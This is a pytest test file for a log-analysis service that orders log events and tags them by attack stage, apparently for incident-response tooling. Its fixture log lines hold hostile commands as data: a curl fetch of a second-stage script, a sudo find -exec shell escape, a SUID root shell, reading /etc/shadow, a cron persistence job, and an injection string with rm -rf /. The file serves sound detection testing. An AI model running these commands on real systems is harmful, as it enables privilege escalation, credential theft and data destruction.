import pytest
from backend.app.schemas.evidence import LogEventCandidate
from backend.app.schemas.timeline import (
    AttackStage,
    EventSeverity,
)
from backend.app.services.timeline.service import TimelineService


def test_empty_candidates_returns_empty_timeline():
    resp = TimelineService.build_timeline([])
    assert resp.event_count == 0
    assert resp.suspicious_count == 0
    assert resp.timeline == []
    assert resp.stages_detected == []
    assert resp.classification_method == "rule_based"


def test_chronological_sorting():
    # Out of chronological order
    candidates = [
        LogEventCandidate(
            event_index=1,
            source_line_number=1,
            event_time="Oct 06 08:45:00",
            raw_message="Oct 06 08:45:00 srv01 cron[12]: task",
        ),
        LogEventCandidate(
            event_index=2,
            source_line_number=2,
            event_time="Oct 06 08:12:00",
            raw_message="Oct 06 08:12:00 srv01 systemd[1]: starting apt",
        ),
        LogEventCandidate(
            event_index=3,
            source_line_number=3,
            event_time="Oct 06 08:30:00",
            raw_message="Oct 06 08:30:00 srv01 sshd[22]: Failed password for root",
        ),
    ]

    resp = TimelineService.build_timeline(candidates)
    assert resp.event_count == 3
    # Check that Oct 06 08:12:00 comes first, then 08:30:00, then 08:45:00
    assert resp.timeline[0].timestamp == "Oct 06 08:12:00"
    assert resp.timeline[0].original_event_index == 2
    assert resp.timeline[1].timestamp == "Oct 06 08:30:00"
    assert resp.timeline[1].original_event_index == 3
    assert resp.timeline[2].timestamp == "Oct 06 08:45:00"
    assert resp.timeline[2].original_event_index == 1


def test_stable_indexing_and_traceability():
    candidates = [
        LogEventCandidate(
            event_index=7,
            source_line_number=14,
            event_time="Oct 06 08:43:45",
            raw_message="Oct 06 08:43:45 srv-corp-lnx01 sudo[2210]: sec_analyst : TTY=pts/0 ; PWD=/home/sec_analyst ; USER=root ; COMMAND=/usr/bin/sudo -l",
        )
    ]
    resp = TimelineService.build_timeline(candidates)
    assert resp.event_count == 1
    evt = resp.timeline[0]
    assert evt.event_id == "timeline-evt-001"
    assert evt.original_event_index == 7
    assert evt.source_line_start == 14
    assert evt.source_line_end == 14
    assert evt.host == "srv-corp-lnx01"
    assert "sudo" in evt.process.lower()


def test_authentication_classification():
    # Failed auth
    cand_fail = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:35:10",
        raw_message="Oct 06 08:35:10 srv01 sshd[2104]: Failed password for invalid user admin from 192.168.1.105 port 43210 ssh2",
    )
    # Success auth
    cand_succ = LogEventCandidate(
        event_index=2,
        source_line_number=2,
        event_time="Oct 06 08:42:15",
        raw_message="Oct 06 08:42:15 srv01 sshd[2150]: Accepted password for sec_analyst from 192.168.1.105 port 43220 ssh2",
    )

    resp = TimelineService.build_timeline([cand_fail, cand_succ])
    evt_fail = resp.timeline[0]
    evt_succ = resp.timeline[1]

    assert evt_fail.attack_stage == AttackStage.AUTHENTICATION
    assert evt_fail.severity == EventSeverity.LOW
    assert evt_fail.suspicious is True
    assert "brute-force" in evt_fail.highlight_reason.lower()

    assert evt_succ.attack_stage == AttackStage.AUTHENTICATION
    assert evt_succ.severity == EventSeverity.INFO
    assert evt_succ.suspicious is False


def test_privilege_discovery_classification():
    cand = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:43:02",
        raw_message="Oct 06 08:43:02 srv01 sudo[2189]: sec_analyst : TTY=pts/0 ; PWD=/home/sec_analyst ; USER=root ; COMMAND=/usr/bin/id",
    )
    resp = TimelineService.build_timeline([cand])
    evt = resp.timeline[0]
    assert evt.attack_stage == AttackStage.PRIVILEGE_DISCOVERY
    assert evt.severity == EventSeverity.MEDIUM
    assert evt.suspicious is True
    assert "id command" in evt.highlight_reason.lower()


def test_privilege_escalation_classification():
    # 1. Audit transition to EUID 0
    cand_privesc = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:46:06",
        raw_message="Oct 06 08:46:06 srv01 auditd[650]: PRIV_ESCALATION: uid=1001 transitioned to euid=0 via /usr/bin/find",
    )
    # 2. SUID shell creation
    cand_suid = LogEventCandidate(
        event_index=2,
        source_line_number=2,
        event_time="Oct 06 08:48:05",
        raw_message="Oct 06 08:48:05 srv01 auditd[650]: FILE_PERM_CHANGE: path=\"/tmp/.rootshell\" mode=4755 suid=true comm=\"chmod\"",
    )
    # 3. Sudo find -exec /bin/sh
    cand_gtfobins = LogEventCandidate(
        event_index=3,
        source_line_number=3,
        event_time="Oct 06 08:46:05",
        raw_message="Oct 06 08:46:05 srv01 sudo[2270]: sec_analyst : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find / -name test -exec /bin/sh -i ;",
    )

    resp = TimelineService.build_timeline([cand_privesc, cand_suid, cand_gtfobins])
    for evt in resp.timeline:
        assert evt.attack_stage == AttackStage.PRIVILEGE_ESCALATION
        assert evt.severity == EventSeverity.CRITICAL
        assert evt.suspicious is True
        assert evt.highlight_reason is not None


def test_suspicious_execution_staging():
    cand_curl = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:44:31",
        raw_message="Oct 06 08:44:31 srv01 auditd[650]: PROCESS_EXEC: pid=2240 comm=\"curl\" cmdline=\"curl -s -o /tmp/.cache_updater http://192.168.1.105:8000/stage2.sh\" user=sec_analyst",
    )
    cand_chmod = LogEventCandidate(
        event_index=2,
        source_line_number=2,
        event_time="Oct 06 08:45:12",
        raw_message="Oct 06 08:45:12 srv01 auditd[650]: PROCESS_EXEC: pid=2255 comm=\"chmod\" cmdline=\"chmod +x /tmp/.cache_updater\" user=sec_analyst",
    )

    resp = TimelineService.build_timeline([cand_curl, cand_chmod])
    assert resp.timeline[0].attack_stage == AttackStage.EXECUTION
    assert resp.timeline[0].severity == EventSeverity.HIGH
    assert resp.timeline[0].suspicious is True

    assert resp.timeline[1].attack_stage == AttackStage.EXECUTION
    assert resp.timeline[1].severity == EventSeverity.MEDIUM
    assert resp.timeline[1].suspicious is True


def test_persistence_classification():
    cand_cron = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:50:30",
        raw_message="Oct 06 08:50:30 srv01 CRON[2350]: (root) CMD (/bin/bash -c 'test -x /tmp/.cache_updater && /tmp/.cache_updater >/dev/null 2>&1')",
    )
    resp = TimelineService.build_timeline([cand_cron])
    evt = resp.timeline[0]
    assert evt.attack_stage == AttackStage.PERSISTENCE
    assert evt.severity == EventSeverity.HIGH
    assert evt.suspicious is True
    assert "cron" in evt.highlight_reason.lower()


def test_credential_access_post_exploitation():
    cand_shadow = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:49:15",
        raw_message="Oct 06 08:49:15 srv01 auditd[650]: FILE_ACCESS: pid=2320 comm=\"cat\" path=\"/etc/shadow\" uid=0 euid=0 res=success",
    )
    resp = TimelineService.build_timeline([cand_shadow])
    evt = resp.timeline[0]
    assert evt.attack_stage == AttackStage.POST_EXPLOITATION
    assert evt.severity == EventSeverity.CRITICAL
    assert evt.suspicious is True
    assert "/etc/shadow" in evt.highlight_reason


def test_no_command_execution_untrusted_text():
    # Verify commands and shell injections within logs are treated solely as inert text
    malicious_payload = "Oct 06 08:55:00 srv01 bash[99]: `rm -rf /` $(whoami) ; echo test"
    cand = LogEventCandidate(
        event_index=1,
        source_line_number=1,
        event_time="Oct 06 08:55:00",
        raw_message=malicious_payload,
    )
    resp = TimelineService.build_timeline([cand])
    assert resp.event_count == 1
    assert resp.timeline[0].raw_message == malicious_payload
